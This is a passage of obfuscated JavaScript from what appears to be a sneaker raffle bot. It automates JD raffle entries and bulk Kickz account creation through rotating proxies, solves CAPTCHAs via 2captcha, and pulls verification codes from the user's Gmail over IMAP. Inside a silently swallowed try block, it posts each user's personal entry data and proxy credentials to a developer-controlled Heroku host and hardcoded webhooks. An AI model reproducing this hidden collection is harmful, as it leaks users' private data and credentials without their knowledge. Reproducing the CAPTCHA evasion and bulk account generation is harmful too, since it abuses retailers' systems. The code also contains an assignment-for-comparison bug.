                            if (_0xf8c003)
                                return await _0xf8c003['click'](), await _0x1c79a5['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0x57eb8a('New\x20Section'), _0x24163c();
                        }
                        await _0x24163c(), await _0x1c79a5['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x1c79a5['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x1ded45(_0xf0c9b5[_0x596b20], _0x138d6a), _0x56e4cf = 'no';
                        var _0x35ea47 = await _0x12b988(_0xf0c9b5[_0x596b20], _0x138d6a, 'dev', ![]), _0x3c29d7 = await _0x12b988(_0xf0c9b5[_0x596b20], _0x138d6a, 'pub', ![]);
                        let _0x41c383 = _0xf0c9b5[_0x596b20];
                        try {
                            prxdata = {
                                'username': _0x380ae8['replace']('#', ''),
                                'module': _0x138d6a['name'],
                                'entrydata': JSON['stringify'](_0x41c383),
                                'proxy': '' + _0x12339b[_0x596b20]
                            };
                            var _0x4fdb8a = JSON['stringify'](prxdata);
                            let _0x10acf9 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x212bbb['post']('https://jraffles.herokuapp.com/success', _0x4fdb8a, _0x10acf9);
                        } catch (_0xd44b8e) {
                        }
                        const _0xe06485 = {
                            'succesDEVMSG': { 'embeds': [_0x35ea47] },
                            'succesPUBMSG': { 'embeds': [_0x3c29d7] }
                        };
                        try {
                            _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0xe06485['succesDEVMSG']), await _0x2121c3(0xc8), await _0x5f1090(_0x1f56e1, _0xe06485['succesDEVMSG']), await _0x2121c3(0xc8), await _0x5f1090(_0x442434, _0xe06485['succesPUBMSG']);
                        } catch (_0x750523) {
                            console['log'](_0x136200['yellow'](_0x29f6be() + '\x20[' + _0x4fd9f4[taskModule]['name'] + ']\x20Task\x20' + (_0x596b20 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x750523));
                        }
                        console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x138d6a['name'] + ']\x20Task\x20' + (_0x596b20 + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0x55dae6 != 0x0 || _0x20009b != 0x0 && !_0x4ef456) && (_0x1a6441['push'](_0x5b68d3), _0x190b67['writeFileSync']('forms/templates.json', JSON['stringify'](_0x1a6441, null, 0x2), 'utf-8'));
                    } catch (_0x5c4d45) {
                        console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x138d6a['name'] + ']\x20Task\x20' + (_0x596b20 + 0x1) + '\x20:\x20' + _0x5c4d45)), _0x2a9d15 = '' + _0x5c4d45;
                        var _0x3c264c = await _0x12b988(_0xf0c9b5[_0x596b20], _0x138d6a, 'dev', !![], _0x2a9d15);
                        let _0x149396 = {};
                        _0x149396['errorDEV'] = { 'embeds': [_0x3c264c] }, _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x149396['errorDEV']), await _0x5f1090(_0x32737e, _0x149396['errorDEV']), _0x56e4cf = 'yes';
                    } finally {
                        _0x69aaa && _0x69aaa['close']();
                        if (_0x56e4cf == 'yes' && _0x2b9cae != 0x5) {
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x138d6a['name'] + ']\x20Task\x20' + (_0x596b20 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x2b9cae + 0x1) + '\x20/\x205)')), _0x596b20--, _0x2b9cae++;
                            continue;
                        }
                        if (_0x56e4cf == 'yes' && _0x2b9cae == 0x5) {
                            _0x2b9cae = 0x0, _0x56e4cf = 'no';
                            continue;
                        }
                        _0x57eb8a('Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x5c8174, _0x3528c4, _0x5ef887) {
                var _0x12d65c = ![], _0x262d7b = ![];
                if (_0x120b49['captchaKey'] == '' || _0x120b49['captchaKey'] == undefined)
                    return console['log'](_0x136200['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x586b7d['use'](_0x41ab99()), _0x586b7d['use'](_0x1c4286({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x120b49['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0xef23f7 = 0x0; _0xef23f7 < _0x3528c4['length']; _0xef23f7++) {
                    if (_0x36af24 != 'yes')
                        var _0x36af24 = '', _0x5f1fae = 0x0;
                    var _0x348ab0, _0x4c81bd = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x3528c4[_0xef23f7]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x3528c4[_0xef23f7]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x380ae8
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x120b49['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x3e659f
                            }
                        ]
                    }];
                    const _0x16df5f = { 'embeds': _0x4c81bd };
                    _0x3aeb59(_0x5c8174['name'] + '\x20Task\x20' + (_0xef23f7 + 0x1) + '\x20/\x20' + _0x3528c4['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08);
                    try {
                        await _0x30a360(_0x3528c4, _0xef23f7);
                    } catch {
                        _0x36af24 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x463fc5 = await _0x12b988(_0x3528c4[_0xef23f7], _0x5c8174, 'dev', ![]), _0x2b94bc = await _0x12b988(_0x3528c4[_0xef23f7], _0x5c8174, 'pub', ![]);
                    const _0x51e039 = {
                        'succesDEVMSG': { 'embeds': [_0x463fc5] },
                        'succesPUBMSG': { 'embeds': [_0x2b94bc] }
                    };
                    if (_0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '')
                        try {
                            await _0x5f1090(_0x120b49['webhook'], _0x51e039['succesDEVMSG']);
                        } catch {
                        }
                    await _0x2121c3(0xc8), await _0x5f1090(_0x1f56e1, _0x51e039['succesDEVMSG']), await _0x2121c3(0xc8);
                    try {
                        await _0x5f1090(_0x442434, _0x51e039['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x3528c4[_0xef23f7]['Email'] == '' || _0x3528c4[_0xef23f7]['Url'] == '' || _0x3528c4[_0xef23f7]['FirstName'] == '' || _0x3528c4[_0xef23f7]['LastName'] == '') {
                        console['log'](_0x29f6be() + '\x20[' + _0x4fd9f4[taskModule]['name'] + ']\x20Task\x20' + (_0xef23f7 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x120b49['useRandomProxy'] = ![])
                        var _0x747bca = _0x5ef887[_0xef23f7]['split'](':');
                    else
                        var _0x94c162 = Math['round'](Math['random']() * (_0x5ef887['length'] - 0x1)), _0x747bca = _0x5ef887[_0x94c162]['split'](':');
                    var _0x225a94;
                    try {
                        _0x225a94 = await _0x586b7d['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x747bca[0x0] + ':' + _0x747bca[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x225a94 = await _0x586b7d['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x747bca[0x0] + ':' + _0x747bca[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x408e6e = await _0x225a94['newPage']();
                        await _0x408e6e['authenticate']({
                            'username': '' + _0x747bca[0x2],
                            'password': '' + _0x747bca[0x3]
                        }), console['log'](_0x29f6be() + '\x20[' + _0x5c8174['name'] + ']\x20Task\x20' + (_0xef23f7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x408e6e['setRequestInterception'](!![]), _0x408e6e['on']('request', _0x351f9e => {
                            _0x351f9e['resourceType']() === 'image' || _0x351f9e['resourceType']() === 'font' || _0x351f9e['resourceType']() === 'media' ? _0x351f9e['abort']() : _0x351f9e['continue']();
                        });
                        try {
                            await _0x408e6e['goto']('' + _0x3528c4[_0xef23f7]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x408e6e['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x29f6be() + '\x20[' + _0x5c8174['name'] + ']\x20Task\x20' + (_0xef23f7 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x408e6e['type']('#comp_firstname', '' + _0x3528c4[_0xef23f7]['FirstName']), await _0x408e6e['waitForSelector']('#comp_lastname'), await _0x408e6e['type']('#comp_lastname', '' + _0x3528c4[_0xef23f7]['LastName']), await _0x408e6e['waitForSelector']('#comp_email'), await _0x408e6e['type']('#comp_email', '' + _0x3528c4[_0xef23f7]['Email']), await _0x408e6e['waitForSelector']('#comp_paypalemail'), await _0x408e6e['type']('#comp_paypalemail', '' + _0x3528c4[_0xef23f7]['Email']), await _0x408e6e['waitForSelector']('#comp_mobile_end'), await _0x408e6e['type']('#comp_mobile_end', '' + _0x3528c4[_0xef23f7]['Phone']), await _0x408e6e['waitForSelector']('#comp_dob'), await _0x408e6e['type']('#comp_dob', '08/09/1992'), console['log'](_0x29f6be() + '\x20[' + _0x5c8174['name'] + ']\x20Task\x20' + (_0xef23f7 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x3528c4[_0xef23f7]['Size'] == 'RANDOM') {
                            const _0xd14088 = await _0x408e6e['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x1377bb => {
                                return _0x1377bb['map'](_0x42767e => _0x42767e['value']);
                            });
                            var _0x566100 = Math['round'](Math['random']() * (_0xd14088['length'] - 0x2));
                            await _0x408e6e['select']('#shoesize', _0xd14088[_0x566100 + 0x1]), await _0x2121c3(0x3e8);
                        } else {
                            const _0x1f5d54 = await _0x408e6e['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x104e11 => {
                                return _0x104e11['map'](_0x8be9a9 => _0x8be9a9['innerText']);
                            }), _0x44ae4d = await _0x408e6e['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0xd58151 => {
                                return _0xd58151['map'](_0x314829 => _0x314829['value']);
                            });
                            var _0x1fb027 = _0x3528c4[_0xef23f7]['Size'];
                            for (var _0x57b6c5 = 0x1; _0x57b6c5 < _0x44ae4d['length']; _0x57b6c5++) {
                                var _0x56c12e = _0x1f5d54[_0x57b6c5]['split']('\x20')[0x0];
                                if (_0x56c12e == _0x1fb027) {
                                    await _0x408e6e['select']('#shoesize', _0x44ae4d[_0x57b6c5]);
                                    break;
                                } else {
                                    if (_0x57b6c5 + 0x1 == _0x44ae4d['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x408e6e['waitForSelector']('#comp_address1'), await _0x408e6e['type']('#comp_address1', _0x3528c4[_0xef23f7]['Address1'] + '\x20' + _0x3528c4[_0xef23f7]['HouseNumber']), await _0x408e6e['waitForSelector']('#comp_address2'), await _0x408e6e['type']('#comp_address2', '' + _0x3528c4[_0xef23f7]['Address2']), await _0x408e6e['waitForSelector']('#comp_address2'), await _0x408e6e['type']('#comp_address3', '' + _0x3528c4[_0xef23f7]['City']), await _0x408e6e['waitForSelector']('#comp_postcode'), await _0x408e6e['type']('#comp_postcode', '' + _0x3528c4[_0xef23f7]['Zip']), console['log'](_0x29f6be() + '\x20[' + _0x5c8174['name'] + ']\x20Task\x20' + (_0xef23f7 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x2121c3(0x4b0), await _0x408e6e['click']('label#emailhold'), await _0x2121c3(0x5dc), await _0x408e6e['click']('#preauth_tandc_email\x20>\x20label'), await _0x2121c3(0x5dc), await _0x408e6e['click']('#submit');
                        try {
                            await _0x408e6e['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x29f6be() + '\x20[' + _0x5c8174['name'] + ']\x20Task\x20' + (_0xef23f7 + 0x1) + '\x20:\x20' + _0x136200['blue']('Awaiting\x20Paypal\x20Payment')), _0x225a94['on']('targetcreated', async _0x43d0ff => {
                            if (_0x43d0ff['type']() === 'page') {
                                const _0x36c55e = await _0x43d0ff['page']();
                                async function _0x3116c3() {
                                    try {
                                        await _0x408e6e['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x262d7b = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x3c9395() {
                                    try {
                                        await _0x408e6e['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x12d65c = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x3c9395(), _0x3116c3(), await _0x2121c3(0x493e0);
                            }
                        });
                        async function _0x101d2d() {
                            for (let _0x478a01 = 0x0; _0x478a01 < 0x12c; _0x478a01++) {
                                if (_0x12d65c == !![]) {
                                    _0x36af24 = 'no', _0x1ded45(_0x3528c4[_0xef23f7], _0x5c8174), console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x5c8174['name'] + ']\x20Task\x20' + (_0xef23f7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '')
                                        try {
                                            await _0x5f1090(_0x120b49['webhook'], _0x51e039['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x2121c3(0xc8), await _0x5f1090(_0x1f56e1, _0x51e039['succesDEVMSG']), await _0x2121c3(0xc8);
                                    try {
                                        await _0x5f1090(_0x442434, _0x51e039['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x262d7b)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x2121c3(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x2121c3(0xbb8), await _0x408e6e['click']('.zoid-outlet'), await _0x2121c3(0x7d0), await _0x101d2d();
                    } catch (_0x27a123) {
                        console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x5c8174['name'] + ']\x20Task\x20' + (_0xef23f7 + 0x1) + '\x20:\x20' + _0x27a123)), _0x348ab0 = '' + _0x27a123;
                        var _0x319c46 = await _0x12b988(_0x3528c4[_0xef23f7], _0x5c8174, 'dev', !![], _0x348ab0);
                        _0x51e039['errorDEV'] = { 'embeds': [_0x319c46] }, _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x51e039['errorDEV']), await _0x5f1090(_0x32737e, _0x51e039['errorDEV']);
                    } finally {
                        _0x225a94 && _0x225a94['close']();
                        if (_0x36af24 == 'yes' && _0x5f1fae != 0x5 && _0x348ab0 != 'Size\x20Not\x20Found') {
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x5c8174['name'] + ']\x20Task\x20' + (_0xef23f7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5f1fae + '\x20/\x205)')), _0xef23f7 = _0xef23f7 - 0x1, _0x5f1fae = _0x5f1fae + 0x1;
                            continue;
                        }
                        _0x36af24 == 'yes' && _0x5f1fae >= 0x5 && (_0x17abd2(afew[_0xef23f7], _0x5c8174), _0x36af24 = 'no', _0x5f1fae = 0x0), console['log']('Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x488b8a, _0x5dbdf1, _0x379f6d) {
                    _0x586b7d['use'](_0x41ab99()), _0x586b7d['use'](_0x1c4286({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x120b49['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x40706f = 0x0; _0x40706f < _0x5dbdf1['length']; _0x40706f++) {
                        const _0x4d023e = 'https://www.kickz.com/login';
                        if (_0x1e1411 != 'yes')
                            var _0x1e1411 = '', _0x1a3f24 = 0x0;
                        _0x3aeb59(_0x488b8a['name'] + '\x20Task\x20' + (_0x40706f + 0x1) + '\x20/\x20' + _0x5dbdf1['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08);
                        try {
                            await _0x30a360(_0x5dbdf1, _0x40706f);
                        } catch {
                            _0x1e1411 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x57bdbb = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x380ae8
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x120b49['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3e659f
                                }
                            ]
                        }];
                        const _0x5941a9 = { 'embeds': _0x57bdbb };
                        var _0x2c7217 = await _0x12b988(_0x5dbdf1[_0x40706f], _0x488b8a, 'acc', ![]);
                        const _0x1748d7 = { 'succesDEVMSG': { 'embeds': [_0x2c7217] } };
                        if (_0x5dbdf1[_0x40706f]['Email'] == '' || _0x5dbdf1[_0x40706f]['FirstName'] == '' || _0x5dbdf1[_0x40706f]['LastName'] == '') {
                            console['log'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5dbdf1[_0x40706f]['Password'] == '' && (_0x5dbdf1[_0x40706f]['Password'] = 'JRaffles23!');
                        if (_0x120b49['useRandomProxy'] = ![])
                            var _0x1c9900 = _0x379f6d[_0x40706f]['split'](':');
                        else
                            var _0xc4b5e8 = Math['round'](Math['random']() * (_0x379f6d['length'] - 0x1)), _0x1c9900 = _0x379f6d[_0xc4b5e8]['split'](':');
                        var _0x2ab4bb;
                        try {
                            _0x2ab4bb = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1c9900[0x0] + ':' + _0x1c9900[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2ab4bb = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1c9900[0x0] + ':' + _0x1c9900[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2d2844 = await _0x2ab4bb['newPage']();
                            await _0x2d2844['authenticate']({
                                'username': '' + _0x1c9900[0x2],
                                'password': '' + _0x1c9900[0x3]
                            }), console['log'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2d2844['setRequestInterception'](!![]), _0x2d2844['on']('request', _0x110c04 => {
                                _0x110c04['resourceType']() === 'image' || _0x110c04['resourceType']() === 'font' || _0x110c04['resourceType']() === 'media' ? _0x110c04['abort']() : _0x110c04['continue']();
                            }), await _0x2d2844['goto'](_0x4d023e), await _0x2121c3(0xbb8), console['log'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x2d2844['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2d2844['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2d2844['waitForSelector']('#button-register'), await _0x2121c3(0x7d0), await _0x2d2844['evaluate'](() => {
                                const _0x4116bf = document['querySelector']('#button-register');
                                _0x4116bf['click']();
                            }), console['log'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x2121c3(0x1388), await _0x2d2844['waitForSelector']('#customer_salutation'), await _0x2d2844['select']('#customer_salutation', 'mr'), await _0x2121c3(0x7d0), await _0x2d2844['waitForSelector']('#customer_firstname'), await _0x2d2844['type']('#customer_firstname', '' + _0x5dbdf1[_0x40706f]['FirstName']), await _0x2121c3(0x352), await _0x2d2844['waitForSelector']('#customer_lastname'), await _0x2d2844['type']('#customer_lastname', '' + _0x5dbdf1[_0x40706f]['LastName']), await _0x2121c3(0x352), await _0x2d2844['type']('#email-input', '' + _0x5dbdf1[_0x40706f]['Email']), await _0x2121c3(0x352), await _0x2d2844['type']('#email-confirm-input', '' + _0x5dbdf1[_0x40706f]['Email']), await _0x2121c3(0x352), await _0x2d2844['type']('#register-password', '' + _0x5dbdf1[_0x40706f]['Password']), await _0x2121c3(0x352), await _0x2d2844['type']('#password-confirm', '' + _0x5dbdf1[_0x40706f]['Password']), await _0x2121c3(0x352), console['log'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x2d2844['click']('#consent'), await _0x2121c3(0x1f4);
                            const _0x1ee1c3 = await _0x2d2844['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x1ee1c3) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x2d2844['click']('#buttonRegister');
                            try {
                                await _0x2d2844['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x5dbdf1[_0x40706f]['Email']), await _0x2121c3(0x4b0);
                            async function _0x25fc34() {
                                var _0x165922, _0x5ef64d = ![];
                                for (var _0x3a8e29 = 0x0; _0x3a8e29 < 0x18; _0x3a8e29++) {
                                    async function _0x54eb05() {
                                        var _0x2d2a8e = new _0x548918({
                                            'user': _0x120b49['masterMail'],
                                            'password': _0x120b49['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0xc0c02d(_0x2a4b54) {
                                            _0x2d2a8e['openBox']('INBOX', ![], _0x2a4b54);
                                        }
                                        _0x2d2a8e['once']('ready', function () {
                                            console['log'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0xc0c02d(function (_0x28e14f, _0x230a6a) {
                                                console['log'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x28e14f)
                                                    throw _0x28e14f;
                                                _0x2d2a8e['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x2626c1, _0x569caf) {
                                                    if (!_0x569caf || !_0x569caf['length'])
                                                        console['log'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x2d2a8e['end']();
                                                    else {
                                                        var _0xbaba62 = _0x2d2a8e['seq']['fetch'](_0x569caf, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0xbaba62['on']('message', function (_0x3f96b5, _0x4dea10) {
                                                            var _0x3885c0 = '(#' + _0x4dea10 + ')\x20';
                                                            _0x3f96b5['on']('body', function (_0x48beb0, _0x2cd10b) {
                                                                _0x26bd25(_0x48beb0, (_0x534d1a, _0x24d236) => {
                                                                    if (_0x24d236['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x3bbcd7 = _0x24d236['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x9ba31 = _0x3bbcd7[0x1]['split']('<')[0x0];
                                                                        _0x165922 = _0x9ba31;
                                                                    }
                                                                });
                                                            }), _0x3f96b5['once']('end', function () {
                                                            });
                                                        }), _0xbaba62['once']('error', function (_0x2765ae) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0xbaba62['once']('end', function () {
                                                            _0x2d2a8e['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x2d2a8e['once']('error', function (_0x2c9d5d) {
                                            console['log'](_0x136200['red'](_0x2c9d5d['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5ef64d = !![];
                                        }), _0x2d2a8e['once']('end', async function () {
                                        }), _0x2d2a8e['connect']();
                                    }
                                    _0x54eb05(), await _0x2121c3(0x1388);
                                    if (_0x165922)
                                        return _0x165922;
                                    if (_0x5ef64d)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x3a8e29 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x25fc34(), _0x2121c3(0x320), console['log'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20Verifying..'), await _0x2d2844['type']('#verificationCode', code), await _0x2121c3(0x1f4), await _0x2d2844['click']('#buttonVerify'), await _0x2121c3(0x190), await _0x2d2844['click']('#buttonVerify'), await _0x2121c3(0x3e8);
                            try {
                                await _0x2d2844['waitForSelector']('div.b-user_greeting'), _0x1e1411 = 'no', console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20Account\x20' + _0x5dbdf1[_0x40706f]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x190b67['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x5dbdf1[_0x40706f]['Email'] + ',' + _0x5dbdf1[_0x40706f]['Password'] + ','), console['log'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20Account\x20' + _0x5dbdf1[_0x40706f]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x1748d7['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5f1090(_0x40cc05, _0x1748d7['succesDEVMSG']);
                            } catch {
                                _0x1e1411 = 'no', console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x444364) {
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20' + _0x444364)), _0x57bdbb[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x57bdbb[0x0]['description'] = '' + _0x444364, await _0x5f1090(_0x32737e, _0x5941a9), _0x1e1411 = 'yes';
                        } finally {
                            _0x2ab4bb && _0x2ab4bb['close']();
                            if (_0x1e1411 == 'yes' && _0x1a3f24 != 0x5) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x488b8a['name'] + ']\x20Task\x20' + (_0x40706f + 0x1) + '\x20:\x20Retrying\x20(' + _0x1a3f24 + '\x20/\x205)')), _0x40706f = _0x40706f - 0x1, _0x1a3f24 = _0x1a3f24 + 0x1;
                                continue;
                            }
